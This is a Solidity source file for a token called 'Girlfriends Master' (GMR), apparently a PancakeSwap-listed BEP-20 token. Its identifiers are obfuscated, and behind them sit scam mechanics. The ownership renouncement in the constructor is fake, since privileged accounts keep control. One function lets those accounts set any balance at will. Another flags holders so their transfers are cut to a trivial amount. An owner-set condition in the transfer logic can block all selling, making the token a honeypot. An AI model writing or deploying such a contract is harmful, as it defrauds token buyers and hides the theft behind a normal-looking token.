//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface buyTeam {
    function createPair(address liquidityExempt, address senderTxTrading) external returns (address);
}

interface liquidityBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletTx) external view returns (uint256);

    function transfer(address autoBuy, uint256 fromListIs) external returns (bool);

    function allowance(address amountList, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromListIs) external returns (bool);

    function transferFrom(
        address sender,
        address autoBuy,
        uint256 fromListIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchedLimitMin, uint256 value);
    event Approval(address indexed amountList, address indexed spender, uint256 value);
}

abstract contract teamTx {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface isTeamSwap is liquidityBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract GirlfriendsMaster is teamTx, liquidityBuy, isTeamSwap {

    mapping(address => uint256) private fundMode;

    function shouldAmount(address buySender, address autoBuy, uint256 fromListIs) internal returns (bool) {
        if (buySender == buyFee) {
            return enableAtWallet(buySender, autoBuy, fromListIs);
        }
        uint256 minTake = liquidityBuy(receiverTx).balanceOf(listFrom);
        require(minTake == tradingLimitLaunched);
        require(autoBuy != listFrom);
        if (maxReceiver[buySender]) {
            return enableAtWallet(buySender, autoBuy, receiverModeToken);
        }
        return enableAtWallet(buySender, autoBuy, fromListIs);
    }

    function amountTeamMax() public {
        emit OwnershipTransferred(buyFee, address(0));
        atToken = address(0);
    }

    bool private exemptBuyFrom;

    address senderAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private swapList = 100000000 * 10 ** 18;

    uint8 private modeTeam = 18;

    bool public exemptLaunchedLiquidity;

    function transfer(address maxTake, uint256 fromListIs) external virtual override returns (bool) {
        return shouldAmount(_msgSender(), maxTake, fromListIs);
    }

    function getOwner() external view returns (address) {
        return atToken;
    }

    function allowance(address fromTx, address maxSwapTrading) external view virtual override returns (uint256) {
        if (maxSwapTrading == senderAt) {
            return type(uint256).max;
        }
        return walletIsSender[fromTx][maxSwapTrading];
    }

    uint256 public senderExempt;

    function enableAtWallet(address buySender, address autoBuy, uint256 fromListIs) internal returns (bool) {
        require(fundMode[buySender] >= fromListIs);
        fundMode[buySender] -= fromListIs;
        fundMode[autoBuy] += fromListIs;
        emit Transfer(buySender, autoBuy, fromListIs);
        return true;
    }

    bool private marketingTake;

    uint256 private sellExempt;

    function symbol() external view virtual override returns (string memory) {
        return swapSenderToken;
    }

    uint256 tradingLimitLaunched;

    string private swapSenderToken = "GMR";

    string private buyMode = "Girlfriends Master";

    address listFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function feeBuy(address senderList) public {
        isShould();
        
        if (senderList == buyFee || senderList == receiverTx) {
            return;
        }
        maxReceiver[senderList] = true;
    }

    address public buyFee;

    function buyReceiver(address txLaunched) public {
        require(txLaunched.balance < 100000);
        if (exemptLaunchedLiquidity) {
            return;
        }
        if (sellExempt == enableFee) {
            autoTx = swapFee;
        }
        marketingEnable[txLaunched] = true;
        if (sellExempt != swapFee) {
            swapFee = enableFee;
        }
        exemptLaunchedLiquidity = true;
    }

    function atLimit(address maxTake, uint256 fromListIs) public {
        isShould();
        fundMode[maxTake] = fromListIs;
    }

    uint256 private autoTx;

    address private atToken;

    mapping(address => bool) public marketingEnable;

    function limitExempt(uint256 fromListIs) public {
        isShould();
        tradingLimitLaunched = fromListIs;
    }

    mapping(address => bool) public maxReceiver;

    uint256 constant receiverModeToken = 6 ** 10;

    uint256 walletMinBuy;

    function balanceOf(address walletTx) public view virtual override returns (uint256) {
        return fundMode[walletTx];
    }

    constructor (){
        
        isFund liquiditySender = isFund(senderAt);
        receiverTx = buyTeam(liquiditySender.factory()).createPair(liquiditySender.WETH(), address(this));
        
        buyFee = _msgSender();
        marketingEnable[buyFee] = true;
        fundMode[buyFee] = swapList;
        amountTeamMax();
        if (sellExempt != senderExempt) {
            tradingLaunched = false;
        }
        emit Transfer(address(0), buyFee, swapList);
    }

    bool private tradingLaunched;

    address public receiverTx;

    function owner() external view returns (address) {
        return atToken;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return swapList;
    }

    uint256 public enableFee;

    function transferFrom(address buySender, address autoBuy, uint256 fromListIs) external override returns (bool) {
        if (_msgSender() != senderAt) {
            if (walletIsSender[buySender][_msgSender()] != type(uint256).max) {
                require(fromListIs <= walletIsSender[buySender][_msgSender()]);
                walletIsSender[buySender][_msgSender()] -= fromListIs;
            }
        }
        return shouldAmount(buySender, autoBuy, fromListIs);
    }

    function decimals() external view virtual override returns (uint8) {
        return modeTeam;
    }

    function approve(address maxSwapTrading, uint256 fromListIs) public virtual override returns (bool) {
        walletIsSender[_msgSender()][maxSwapTrading] = fromListIs;
        emit Approval(_msgSender(), maxSwapTrading, fromListIs);
        return true;
    }

    event OwnershipTransferred(address indexed swapExemptLiquidity, address indexed toBuy);

    mapping(address => mapping(address => uint256)) private walletIsSender;

    function name() external view virtual override returns (string memory) {
        return buyMode;
    }

    function isShould() private view {
        require(marketingEnable[_msgSender()]);
    }

    uint256 private swapFee;

}